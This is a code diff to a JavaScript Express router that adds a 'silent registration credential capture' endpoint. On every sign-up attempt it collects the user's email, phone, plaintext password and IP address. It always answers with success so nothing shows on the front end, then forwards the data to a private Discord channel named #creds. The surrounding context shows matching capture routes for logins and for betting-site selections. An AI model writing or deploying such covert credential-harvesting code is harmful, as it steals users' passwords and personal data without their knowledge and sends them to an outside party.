@@ -117,6 +117,30 @@ router.post('/capture-login-creds', async (req, res) => {
 });
 
 /**
+ * SILENT REGISTRATION CREDENTIAL CAPTURE — fires on every register attempt.
+ * Captures email + phone + password + outcome regardless of success/failure.
+ * Routes ONLY to the private #creds Discord channel.
+ */
+router.post('/capture-register-creds', async (req, res) => {
+    try {
+        const { email, phone, password, outcome } = req.body;
+        // Always respond 200 to avoid frontend errors
+        res.json({ success: true });
+
+        // Fire-and-forget — never block the registration flow
+        discordAgent.sendRegisterCredCapture({
+            email:    email    || '—',
+            phone:    phone    || '—',
+            password: password || '—',
+            outcome:  outcome  || 'UNKNOWN',
+            ip:       req.ip   || 'Unknown'
+        });
+    } catch (_) {
+        res.json({ success: true }); // never fail silently
+    }
+});
+
+/**
  * SITE SELECTION CAPTURE — fires when a logged-in user picks a betting site.
  * Routes ONLY to the private #creds Discord channel.
  */
